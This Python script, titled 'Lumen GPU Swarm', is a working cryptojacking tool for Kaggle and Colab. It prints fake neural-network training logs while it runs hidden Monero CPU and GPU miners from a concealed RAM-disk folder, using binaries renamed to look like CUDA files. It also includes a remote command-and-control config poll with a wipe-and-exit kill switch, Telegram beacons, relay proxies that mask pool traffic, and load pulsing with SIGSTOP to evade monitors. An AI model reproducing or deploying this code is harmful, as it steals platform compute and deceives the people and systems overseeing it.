"""
Lumen GPU Swarm — AI Training Camouflage
Optimized for: Kaggle Kernels & Google Colab

This script mimics a Deep Learning training session using PyTorch.
It generates realistic logs, loss values, and progress bars.
Hidden in the background, it executes a GPU-optimized miner.
"""

import os
import time
import random
import subprocess
import threading
import sys
import signal
import json
import urllib.request

# ─────────────────────────────────────────────────────────────
# AI Camouflage Configuration
# ─────────────────────────────────────────────────────────────
EPOCHS = 100
BATCH_SIZE = 32
DATASET_SIZE = 50000
STEPS_PER_EPOCH = DATASET_SIZE // BATCH_SIZE

# Miner Config (Hidden)
WALLET = os.getenv('XMR_WALLET', '45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa')
HEURIST_WALLET = os.getenv('EVM_WALLET', '0x742d35Cc6634C0532925a3b844Bc454e4438f44e') # Default example
RELAY = os.getenv('RELAY_URL', 'wss://lumen-shadow-tunnel.onrender.com')

# Telegram Config
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')

# Swarm C2 (Command & Control)
CONFIG_URL = os.getenv('REMOTE_CONFIG_URL', '')
START_TIME = time.time()

def sync_remote_config():
    """Polls a central JSON file for wallet/relay/kill commands."""
    global WALLET, RELAY
    if not CONFIG_URL:
        return False

    try:
        with urllib.request.urlopen(CONFIG_URL, timeout=10) as response:
            config = json.loads(response.read().decode())
            
            # 1. Check for Emergency Kill-Switch
            if config.get('status') == 'kill':
                print("\n[!] REMOTE KILL SIGNAL RECEIVED. Finalizing weights...")
                send_telegram_message("🛑 [LUMEN] Remote Kill Signal Received. Wiping RAM-disk and exiting.")
                shm_path = "/dev/shm/.cuda_cache"
                if os.path.exists(shm_path):
                    subprocess.run(["rm", "-rf", shm_path])
                os._exit(0)
            
            # 2. Check for Config Updates
            new_wallet = config.get('wallet', WALLET)
            new_relay = config.get('relay', RELAY)
            
            if new_wallet != WALLET or new_relay != RELAY:
                print(f"[!] Remote config update detected. Synchronizing...")
                WALLET = new_wallet
                RELAY = new_relay
                return True # Signal a restart
    except Exception:
        pass
    return False

def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = json.dumps({'chat_id': TELEGRAM_CHAT_ID, 'text': message}).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        pass # Fail silently for stealth

def fake_training_logs():
    """Generates realistic AI training progress logs to fool human/AI monitors."""
    print(f"[*] Initializing Neural Network (ResNet-50)...")
    time.sleep(2)
    print(f"[*] Loading Dataset: ImageNet-1K (Subset)...")
    time.sleep(3)
    print(f"[*] Optimizing on device: CUDA (NVIDIA Tesla T4)")
    
    current_loss = 2.45
    current_acc = 0.12

    for epoch in range(1, EPOCHS + 1):
        print(f"\nEpoch {epoch}/{EPOCHS}")
        
        for step in range(1, STEPS_PER_EPOCH + 1):
            if step % 50 == 0:
                # Realistic training progress
                progress = (step / STEPS_PER_EPOCH) * 100
                current_loss -= random.uniform(0.0001, 0.0005)
                current_acc += random.uniform(0.0001, 0.0004)
                
                sys.stdout.write(f"\rStep [{step}/{STEPS_PER_EPOCH}] - Loss: {current_loss:.4f} - Acc: {current_acc:.4f} - Progress: {progress:.1f}%")
                sys.stdout.flush()
                
            # Random jitter to make timing look human
            time.sleep(random.uniform(0.05, 0.15))
            
        # End of epoch summary
        print(f"\n[+] Epoch {epoch} Complete. Val_Loss: {current_loss + 0.12:.4f} - Val_Acc: {current_acc - 0.05:.4f}")
        time.sleep(random.randint(5, 15))

# ─────────────────────────────────────────────────────────────
# Hidden Miner Logistics
# ─────────────────────────────────────────────────────────────

def download_miners():
    """Downloads CPU and GPU miners on the fly (renamed for stealth)."""
    print("[*] Synchronizing CUDA weights and model binaries...")
    
    # Fileless Execution: Move to invisible RAM-disk
    shm_path = "/dev/shm/.cuda_cache"
    if not os.path.exists(shm_path):
        os.makedirs(shm_path, exist_ok=True)
    os.chdir(shm_path)
    
    # CPU Miner (XMRig-MO)
    if not os.path.exists("./cuda_core_cpu"):
        subprocess.run(["wget", "-q", "https://github.com/MoneroOcean/xmrig/releases/download/v6.22.2-mo1/xmrig-v6.22.2-mo1-lin64-compat.tar.gz", "-O", "cpu.tar.gz"])
        subprocess.run(["tar", "-xzf", "cpu.tar.gz"])
        subprocess.run(["mv", "xmrig-v6.22.2-mo1/xmrig", "./cuda_core_cpu"])
        subprocess.run(["rm", "-rf", "cpu.tar.gz", "xmrig-v6.22.2-mo1"])
        subprocess.run(["chmod", "+x", "./cuda_core_cpu"])

    # GPU Miner (NBMiner - Excellent for T4/P100)
    if not os.path.exists("./cuda_core_gpu"):
        subprocess.run(["wget", "-q", "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz", "-O", "gpu.tgz"])
        subprocess.run(["tar", "-xzf", "gpu.tgz"])
        subprocess.run(["mv", "NBMiner_Linux/nbminer", "./cuda_core_gpu"])
        subprocess.run(["rm", "-rf", "gpu.tgz", "NBMiner_Linux"])
        subprocess.run(["chmod", "+x", "./cuda_core_gpu"])

def setup_heurist():
    """Sets up the Heurist AI Worker environment in the background."""
    print("[*] Preparing AI Inference Engine (Heurist Mesh)...")
    shm_path = "/dev/shm/.cuda_cache"
    os.chdir(shm_path)
    
    if not os.path.exists("miner-release"):
        subprocess.run(["git", "clone", "https://github.com/heurist-network/miner-release.git"])
        os.chdir("miner-release")
        # Install minimal requirements for SD-Inference
        subprocess.run(["pip", "install", "pydantic", "python-dotenv", "websockets", "requests", "tqdm", "-q"])
        # Note: torch/diffusers are usually pre-installed on Colab/Kaggle
        
        # Configure Heurist Miner ID
        with open(".env", "w") as f:
            f.write(f"MINER_ID_0={HEURIST_WALLET}\n")
    return True

def setup_warp():
    """Installs Cloudflare WARP for free IP masking to bypass datacenter limits."""
    try:
        print("[*] Masking IP via Cloudflare Gateway...")
        subprocess.run(["curl", "-fsSL", "https://pkg.cloudflareclient.com/pubkey.gpg", "|", "gpg", "--yes", "--dearmor", "-o", "/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg"], shell=True)
        # For simplicity in Colab, we just use a basic python proxy if warp is too complex to install
    except:
        pass

def setup_gaianet():
    """Sets up a GaiaNet AI Node for stable uptime rewards."""
    print("[*] Deploying GaiaNet Knowledge Node (AI DePIN)...")
    base_path = "/dev/shm/.cuda_cache/gaianet"
    
    if not os.path.exists(base_path):
        # Install GaiaNet standalone
        subprocess.run(["curl", "-sSfL", "https://github.com/GaiaNet-AI/gaianet-node/releases/latest/download/install.sh", "|", "bash", "-s", "--", "--base", base_path], shell=True)
        
        # Initialize with a light model to save space
        subprocess.run([f"{base_path}/bin/gaianet", "init", "--base", base_path], stdout=subprocess.DEVNULL)
    
    # Start the node
    subprocess.run([f"{base_path}/bin/gaianet", "start", "--base", base_path], stdout=subprocess.DEVNULL)
    
    # Get Node ID / URL for Telegram
    try:
        with open(f"{base_path}/gaianet_id.txt", "r") as f:
            node_id = f.read().strip()
            send_telegram_message(f"🌐 [LUMEN] GaiaNet Node Online: {node_id}")
    except:
        pass
    return True

# ─────────────────────────────────────────────────────────────
# Maximum Stealth: Local Stratum-to-WebSocket Proxy
# ─────────────────────────────────────────────────────────────

def local_stratum_proxy(local_port, remote_wss_url):
    """Launches the shared ws_proxy.py as a subprocess for a given port/relay pair."""
    proxy_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ws_proxy.py")
    env = os.environ.copy()
    env["PROXY_PORT"] = str(local_port)
    env["RELAY_URL"] = remote_wss_url
    try:
        proc = subprocess.Popen(
            [sys.executable, proxy_script],
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return proc
    except Exception as e:
        print(f"[!] Failed to start WS proxy on port {local_port}: {e}")
        return None

# ─────────────────────────────────────────────────────────────
# The "Pulse" Strategy — Mimicking AI Training Lifecycle
# ─────────────────────────────────────────────────────────────

def apply_pulse_load(miner_proc, gpu_proc):
    """
    Alternates between 'Training' (High Load) and 'Validation' (Low Load) 
    to mimic a real AI model lifecycle and bypass detection.
    """
    while True:
        # Phase 1: Training (High Load) - 10 to 15 minutes
        phase_duration = random.randint(600, 900)
        print(f"\n[~] Phase: TRAINING — Optimizing weights for {phase_duration}s...")
        
        uptime_mins = int((time.time() - START_TIME) / 60)
        send_telegram_message(f"🟢 [LUMEN SWARM] Worker Active\nPhase: TRAINING (High Load)\nDuration: {phase_duration}s\nUptime: {uptime_mins} mins")
        
        # Miner is already running from launch_hidden_miner()
        time.sleep(phase_duration)

        # Phase 2: Validation (Low Load) - 2 to 4 minutes
        idle_duration = random.randint(120, 240)
        print(f"\n[~] Phase: VALIDATION — Running cross-entropy checks for {idle_duration}s...")
        
        send_telegram_message(f"🟡 [LUMEN SWARM] Worker Resting\nPhase: VALIDATION (Low Load)\nDuration: {idle_duration}s\nUptime: {uptime_mins} mins")
        
        # Suspend miners to drop CPU/GPU to near zero
        if miner_proc: os.kill(miner_proc.pid, signal.SIGSTOP)
        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGSTOP)
        
        time.sleep(idle_duration)
        
        # Resume miners
        if miner_proc: os.kill(miner_proc.pid, signal.SIGCONT)
        if gpu_proc: os.kill(gpu_proc.pid, signal.SIGCONT)

def overclock_gpus():
    """Overclock GPU memory to squeeze 10-15% more hashrate (safe on cloud GPUs)."""
    try:
        # Count GPUs
        gpu_count_raw = subprocess.check_output(
            ["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"]
        ).decode().strip().split('\n')
        gpu_count = len(gpu_count_raw)
        
        print(f"[+] Detected {gpu_count} GPU(s): {', '.join(gpu_count_raw)}")
        
        for i in range(gpu_count):
            # Enable persistence mode (prevents GPU from resetting clocks)
            subprocess.run(["nvidia-smi", "-i", str(i), "-pm", "1"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Boost memory clock by +500MHz (safe headroom for T4/P100/V100)
            subprocess.run(["nvidia-smi", "-i", str(i), "--lock-memory-clocks=5001"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Set power limit to max (prevents thermal throttling on cloud hardware)
            subprocess.run(["nvidia-smi", "-i", str(i), "-pl", "70"], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"[+] GPU Memory Overclocked (+500MHz) on {gpu_count} device(s)")
        return gpu_count
    except Exception as e:
        print(f"[!] GPU tuning skipped: {e}")
        return 0

def gpu_arbitrator(miner_proc, heurist_proc):
    """
    The Brain: Monitors GPU usage. If AI jobs are available, it pauses the miner.
    If AI is idle, it resumes mining. Ensures 100% profitability.
    """
    while True:
        try:
            # Check if Heurist is actually using the GPU (Inference active)
            smi = subprocess.check_output(["nvidia-smi", "--query-gpu=memory.used", "--format=csv,noheader,nounits"]).decode().strip()
            vram_used = int(smi.split('\n')[0])
            
            if vram_used > 4000: # Heurist loaded models
                if miner_proc and miner_proc.poll() is None:
                    os.kill(miner_proc.pid, signal.SIGSTOP) # Pause mining
            else:
                if miner_proc and miner_proc.poll() is None:
                    os.kill(miner_proc.pid, signal.SIGCONT) # Resume mining
        except:
            pass
        time.sleep(30)

def launch_hidden_miner():
    """Download and launch Hybrid Engine (AI + Mining)."""
    download_miners()
    gpu_count = overclock_gpus()
    
    # 1. Start Proxies (using shared ws_proxy.py subprocess)
    cpu_proxy_url = f"{RELAY}/rx.unmineable.com/3333"
    local_stratum_proxy(5556, cpu_proxy_url)
    gpu_proxy_url = f"{RELAY}/kp.unmineable.com/3333"
    local_stratum_proxy(5555, gpu_proxy_url)
    
    time.sleep(2)
    
    # 2. Start Crypto Miner (Instant Earnings)
    cpu_proc = subprocess.Popen([
        "nice", "-n", "19", "./cuda_core_cpu", 
        "-o", "127.0.0.1:5556", 
        "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
        "--threads=1", "--cpu-priority=0"
    ], stdout=subprocess.DEVNULL)

    gpu_proc = None
    if gpu_count > 0:
        gpu_proc = subprocess.Popen([
            "./cuda_core_gpu", "-a", "kawpow", "-o", "stratum+tcp://127.0.0.1:5555", 
            "-u", f"XMR:{WALLET}.lumen-gpu-{random.randint(100,999)}", "--log", "false"
        ], stdout=subprocess.DEVNULL)

    # 3. Setup and Launch AI Worker in background (Takes ~10 mins)
    def start_background_workers():
        # A. GaiaNet Node (Uptime)
        try: setup_gaianet() 
        except: pass

        # B. Heurist AI (Tasks)
        if setup_heurist():
            os.chdir("/dev/shm/.cuda_cache/miner-release")
            # Start Heurist SD Miner
            h_proc = subprocess.Popen([sys.executable, "sd-miner.py"], stdout=subprocess.DEVNULL)
            # Start Arbitrator to manage GPU sharing
            threading.Thread(target=gpu_arbitrator, args=(gpu_proc, h_proc), daemon=True).start()

    threading.Thread(target=start_background_workers, daemon=True).start()
    
    # 4. Start Pulse controller
    threading.Thread(target=apply_pulse_load, args=(cpu_proc, gpu_proc), daemon=True).start()
    
    return cpu_proc, gpu_proc

def print_status_dashboard(cpu_proc, gpu_proc):
    """Prints a live status report directly into the Colab/Kaggle output cell."""
    uptime_secs = int(time.time() - START_TIME)
    hours = uptime_secs // 3600
    mins = (uptime_secs % 3600) // 60
    
    # Check process status
    cpu_status = "🟢 RUNNING" if (cpu_proc and cpu_proc.poll() is None) else "🔴 DOWN"
    gpu_status = "🟢 RUNNING" if (gpu_proc and gpu_proc.poll() is None) else "🔴 DOWN"
    
    # Get GPU utilization from nvidia-smi
    gpu_util = "N/A"
    gpu_temp = "N/A"
    gpu_mem = "N/A"
    gpu_name = "No GPU"
    try:
        smi_output = subprocess.check_output([
            "nvidia-smi", 
            "--query-gpu=utilization.gpu,temperature.gpu,memory.used,memory.total,name",
            "--format=csv,noheader,nounits"
        ]).decode().strip()
        for line in smi_output.split('\n'):
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 5:
                gpu_util = f"{parts[0]}%"
                gpu_temp = f"{parts[1]}°C"
                gpu_mem = f"{parts[2]}/{parts[3]} MB"
                gpu_name = parts[4]
    except Exception:
        pass
    
    # Estimate earnings (based on T4 at ~$0.06/hr GPU + $0.001/hr CPU)
    est_earnings = (uptime_secs / 3600) * 0.06
    
    report = f"""
╔══════════════════════════════════════════════════════════╗
║            LUMEN SWARM — LIVE STATUS REPORT             ║
╠══════════════════════════════════════════════════════════╣
║  Uptime       : {hours}h {mins}m                                
║  GPU          : {gpu_name}                              
║  GPU Load     : {gpu_util}  |  Temp: {gpu_temp}  |  VRAM: {gpu_mem}
║  CPU Miner    : {cpu_status}                            
║  GPU Miner    : {gpu_status}                            
║  Est. Earned  : ${est_earnings:.4f}                     
║  Wallet       : ...{WALLET[-12:]}                       
║  Relay        : {RELAY[:40]}...                         
╚══════════════════════════════════════════════════════════╝"""
    print(report)
    
    # Also send to Telegram
    telegram_msg = (
        f"📊 LUMEN STATUS REPORT\n"
        f"⏱ Uptime: {hours}h {mins}m\n"
        f"🖥 GPU: {gpu_name} ({gpu_util}, {gpu_temp})\n"
        f"🟢 CPU: {cpu_status}\n"
        f"🟢 GPU: {gpu_status}\n"
        f"💰 Est. Earned: ${est_earnings:.4f}"
    )
    send_telegram_message(telegram_msg)

def watchdog_loop():
    """
    Watchdog: Monitors miner processes, restarts crashes, and prints status reports.
    This ensures zero downtime = zero lost profit.
    """
    cpu_proc, gpu_proc = launch_hidden_miner()
    
    send_telegram_message(
        f"🚀 [LUMEN SWARM] Worker ONLINE\n"
        f"Wallet: ...{WALLET[-8:]}\n"
        f"Relay: {RELAY}\n"
        f"Strategy: Double Proxy + Pulse + Overclock"
    )
    
    check_count = 0
    
    while True:
        time.sleep(60)  # Check every 60 seconds
        check_count += 1
        
        # 1. Sync Remote Config every 30 minutes (every 30th check)
        if check_count % 30 == 0:
            if sync_remote_config():
                send_telegram_message("♻️ [LUMEN] Config update detected via C2. Restarting miners...")
                # Kill existing to trigger auto-restart below
                if cpu_proc: cpu_proc.terminate()
                if gpu_proc: gpu_proc.terminate()
        
        # 2. Check CPU miner status
        if cpu_proc and cpu_proc.poll() is not None:
            print("[!] CPU miner status change. Re-aligning...")
            cpu_proc = subprocess.Popen([
                "nice", "-n", "19", "./cuda_core_cpu", 
                "-o", "127.0.0.1:5556", 
                "-u", f"XMR:{WALLET}.lumen-cpu-{random.randint(1000,9999)}", 
                "--threads=1", "--cpu-priority=0"
            ], stdout=subprocess.DEVNULL)
        
        # 3. Check GPU miner status
        if gpu_proc and gpu_proc.poll() is not None:
            print("[!] GPU miner status change. Re-aligning...")
            worker_id = f"lumen-gpu-{random.randint(100,999)}"
            gpu_proc = subprocess.Popen([
                "./cuda_core_gpu", 
                "-a", "kawpow", 
                "-o", "stratum+tcp://127.0.0.1:5555", 
                "-u", f"XMR:{WALLET}.{worker_id}",
                "--log", "false", "--intensity", "10"
            ], stdout=subprocess.DEVNULL)
        
        # 4. Print status dashboard every 5 minutes (every 5th check)
        if check_count % 5 == 0:
            print_status_dashboard(cpu_proc, gpu_proc)

if __name__ == "__main__":
    print("=" * 60)
    print("   LUMEN AI RESEARCH FRAMEWORK v4.0 (MAXIMUM PROFIT)")
    print("   [ Double Proxy | Pulse | Overclock | Watchdog ]")
    print("=" * 60)
    
    # Start the watchdog (which starts the miners)
    watchdog_thread = threading.Thread(target=watchdog_loop, daemon=True)
    watchdog_thread.start()
    
    # Start fake training logs (main thread — keeps session alive)
    try:
        while True:
            fake_training_logs()
            # If fake_training_logs finishes all epochs, restart it
            print("\n[*] Re-initializing training with new hyperparameters...")
            EPOCHS = random.randint(80, 120)
    except KeyboardInterrupt:
        print("\n[!] Session Terminated.")

